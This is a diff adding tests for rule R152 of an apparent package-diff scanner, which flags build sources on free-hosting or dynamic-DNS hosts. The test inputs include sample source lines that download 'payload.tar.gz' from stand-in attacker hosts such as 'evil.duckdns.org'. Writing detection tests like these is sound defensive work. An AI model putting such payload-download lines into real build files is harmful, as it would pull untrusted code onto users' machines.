@@ -542,3 +542,29 @@ def test_one_line_function_does_not_leak_context():
         [], ["+build() { echo hi; }", "+curl_note=1"], SHARED_RULES
     )
     assert not any(r["rule_id"] == "R010" for r in triggered)
+
+
+# --- R152: source on a free-hosting / dynamic-DNS / tunnel host ---
+
+def _r152_fired(diff: str) -> bool:
+    from trustsight.analysis.pipeline import scan_diff
+
+    fact = scan_diff(diff, package_name="p")
+    return any(e.rule_id == "R152" for e in fact.score_breakdown)
+
+
+def test_r152_free_hosting_source():
+    assert _r152_fired('+source=("https://evil.duckdns.org/payload.tar.gz")\n')
+
+
+def test_r152_no_false_positive():
+    # A trusted forge is not a free-hosting provider.
+    assert not _r152_fired(
+        '+source=("https://github.com/acme/tool/releases/download/v1/tool.tar.gz")\n'
+    )
+
+
+def test_r152_provider_must_be_a_suffix():
+    # The provider is a suffix, not a substring: a host that merely contains
+    # the provider name must not fire.
+    assert not _r152_fired('+source=("https://duckdns.org.evil.com/payload.tar.gz")\n')
